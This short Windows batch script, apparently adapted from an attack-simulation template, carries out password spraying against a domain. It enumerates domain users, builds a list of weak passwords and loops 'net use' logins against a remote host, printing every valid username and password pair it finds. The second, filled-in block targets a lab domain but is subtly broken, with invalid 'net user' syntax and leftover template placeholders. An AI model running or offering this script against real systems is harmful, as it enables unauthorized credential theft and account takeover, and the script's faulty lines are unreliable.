#net user /domain > #{input_file_users}
#echo "Password1" >> #{input_file_passwords}
#echo "1q2w3e4r" >> #{input_file_passwords}
#echo "Password!" >> #{input_file_passwords}
#@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL

net user /patternex.lab > .\input_file_users.txt
echo "Password1" >> .\input_file_passwords.txt
echo "1q2w3e4r" >>  .\input_file_passwords.txt
echo "Password!" >> .\input_file_passwords.txt

@FOR /F %n in (.\input_file_users.txt) DO 
@FOR /F %p in (.\input_file_passwords.txt) DO 
    @net use internal-win10 /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p &&
@net use /delete #{remote_host} 
